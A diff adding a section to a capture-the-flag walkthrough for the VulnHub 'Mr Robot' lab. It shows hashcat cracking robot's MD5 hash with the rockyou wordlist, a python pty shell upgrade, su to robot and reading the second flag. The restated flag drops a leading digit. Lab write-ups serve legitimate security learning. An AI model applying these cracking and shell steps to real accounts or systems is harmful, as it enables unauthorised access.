@@ -2609,10 +2609,176 @@ robot:c3fcd3d76192e4007dfb496cca67e13b
 Now there are many ways we can go about cracking this hash, the quickest way is to go to <a href="https://crackstation.net/" rel="nofollow">CrackStation</a> and crack the hash online.
 <p></p>
 <div align="center">
-<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e013fb58f5002d89c977e8cec0e9d6eb86f3d11f/Starting_Point/VulnHub/MrRobot/images/insidereverse.png"><br>
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/5d2237b72e4e9f0b959c73f6bfe572a084de3649/Starting_Point/VulnHub/MrRobot/images/crackstation.png"><br>
 </div>
 <p></p>
+We can also carry this out locally using a program called hashcat. First we need to copy the hash we found on the target VM into a text file, I did this using this command:
+<p></p>
 
+```
+echo c3fcd3d76192e4007dfb496cca67e13b > hash.hash
+```
+
+<p></p>
+You have view the help file for hashcat using the following command:
+<p></p>
+
+```
+hashcat --help
+```
+
+<p></p>
+The command we will use is:
+<p></p>
+
+```
+hashcat -a 0 -m 0 hash.hash /usr/share/wordlists/rockyou.txt
+```
+
+<p></p>
+Which outputs:
+<p></p>
+
+```
+❯ hashcat -a 0 -m 0 hash.hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-8650U CPU @ 1.90GHz, 5814/5878 MB (2048 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 66 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: MD5
+Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
+Time.Started.....: Fri Jul  9 15:13:59 2021 (0 secs)
+Time.Estimated...: Fri Jul  9 15:13:59 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2210.3 kH/s (0.40ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 40960/14344385 (0.29%)
+Rejected.........: 0/40960 (0.00%)
+Restore.Point....: 32768/14344385 (0.23%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: dyesebel -> loserface1
+
+Started: Fri Jul  9 15:13:57 2021
+Stopped: Fri Jul  9 15:14:01 2021
+```
+
+<p></p>
+And we can see that we cracked the hash.
+<p></p>
+
+```
+c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+```
+
+<p></p>
+Meaning the password is:
+<p></p>
+
+```
+abcdefghijklmnopqrstuvwxyz
+```
+
+<p></p>
+We can use this password to attempt to login as robot but first we need to establish a proper shell we do this by entering:
+<p></p>
+
+```
+shell
+```
+
+<p></p>
+Followed by:
+<p></p>
+
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+<p></p>
+Which you can see changes our command input to:
+<p></p>
+
+```
+daemon@linux:/home/robot$
+```
+
+<p></p>
+We can now switch user by entering:
+<p></p>
+
+```
+su robot
+```
+
+<p></p>
+And entering the password when prompted. You can see this is successful when your command input changes to:
+<p></p>
+
+```
+robot@linux:~$
+```
+
+<p></p>
+And can confirm this by entering:
+<p></p>
+
+```
+robot@linux:~$ id
+id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+```
+
+<p></p>
+Now that we are the user 'robot' we should be able to open key-2-of-3.txt and get our second flag.
+<p></p>
+
+```
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+<p></p>
+Giving us the second flag, 22c73956184f694993bede3eb39f959
+<p></p>
 
 
 
